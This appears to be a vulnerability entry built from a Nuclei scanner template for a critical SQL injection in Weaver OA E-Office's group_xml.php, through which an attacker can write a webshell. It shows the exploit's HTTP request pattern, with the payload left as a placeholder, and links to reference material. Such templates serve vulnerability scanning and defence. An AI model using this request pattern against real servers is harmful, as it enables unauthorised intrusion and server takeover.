# Nuclei Template: OA E-Office group_xml.php - SQL Injection
**Template ID:** weaver-group-xml-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**Source:** Nuclei Template (`weaver-group-xml-sqli.yaml`)

## Vulnerability Information & PoC

## Description
There is a SQL injection vulnerability in the Panwei OA E-Office group_xml.php file. Through the vulnerability, an attacker can write to the Webshell file to obtain server permissions.

## Steps to reproduce / Exploit Payload
```http
GET /inc/group_user_list/group_xml.php?par={{base64(payload)}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

GET /{{filename}}.php HTTP/1.1
Host: {{Hostname}}
```

## References
- http://wiki.peiqi.tech/wiki/oa/泛微OA/泛微OA%20E-Office%20group_xml.php%20SQL注入漏洞.html
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20group_xml.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
